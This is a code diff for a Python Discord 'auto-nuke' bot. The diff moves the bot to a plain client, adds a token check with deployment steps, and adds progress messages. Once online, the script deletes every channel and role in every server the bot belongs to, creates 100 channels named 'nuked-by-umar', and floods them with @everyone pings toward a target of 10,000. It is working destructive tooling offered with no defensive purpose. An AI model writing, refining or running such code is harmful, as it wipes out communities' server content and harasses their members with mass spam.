@@ -1,5 +1,4 @@
 import discord
-from discord.ext import commands
 import asyncio
 import os
 
@@ -7,30 +6,41 @@ import os
 TOKEN = os.environ.get('TOKEN')
 OWNER_ID = 361069640962801664
 
-# ===== BOT SETUP =====
+# Check if token exists
+if not TOKEN:
+    print("❌ ERROR: No token found!")
+    print("   Set TOKEN environment variable in Railway:")
+    print("   1. Go to Railway Dashboard")
+    print("   2. Click Variables tab")
+    print("   3. Add TOKEN = your_bot_token")
+    exit(1)
+
+# ===== CLIENT SETUP (NO COMMANDS) =====
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=None, intents=intents, help_command=None)
+client = discord.Client(intents=intents)
 
 # ===== AUTO NUKE - IMMEDIATE DESTRUCTION =====
-@bot.event
+@client.event
 async def on_ready():
-    print(f"🤖 BOT ONLINE: {bot.user.name}")
-    print(f"🔗 Connected to {len(bot.guilds)} servers")
+    print(f"🤖 BOT ONLINE: {client.user.name}")
+    print(f"🔗 Connected to {len(client.guilds)} servers")
     print("💣 STARTING AUTO-NUKE ON ALL SERVERS...")
     
     # NUKE EVERY SERVER THE BOT IS IN
-    for guild in bot.guilds:
+    for guild in client.guilds:
         print(f"\n🔥 NUKE INITIATED ON: {guild.name}")
         
         # STEP 1: DELETE ALL CHANNELS (FASTEST)
-        for channel in guild.channels:
+        print(f"   Deleting {len(guild.channels)} channels...")
+        for channel in list(guild.channels):
             try:
                 await channel.delete()
             except:
                 pass
         
         # STEP 2: DELETE ALL ROLES (FASTEST)
-        for role in guild.roles:
+        print(f"   Deleting roles...")
+        for role in list(guild.roles):
             if role.name != "@everyone":
                 try:
                     await role.delete()
@@ -38,19 +48,19 @@ async def on_ready():
                     pass
         
         # STEP 3: CREATE 100 CHANNELS + PING SPAM
+        print(f"   Creating 100 spam channels...")
         channels = []
         
-        # Create channels
         for i in range(100):
             try:
                 channel = await guild.create_text_channel("nuked-by-umar")
                 channels.append(channel)
-                # Ping immediately
                 await channel.send("@everyone NUKED BY UMAR")
             except:
                 pass
         
         # STEP 4: MASS PING SPAM - ABSOLUTE MAX SPEED
+        print(f"   Spamming pings...")
         ping_count = 0
         target = 10000
         
@@ -65,8 +75,9 @@ async def on_ready():
                     pass
     
     print("\n💀 AUTO-NUKE COMPLETE - ALL SERVERS DESTROYED 💀")
+    print("🛑 Bot will now disconnect...")
+    await client.close()
 
 # ===== RUN BOT =====
-bot.run(TOKEN)
-
-
+print("🚀 Starting Auto-Nuke Bot...")
+client.run(TOKEN)
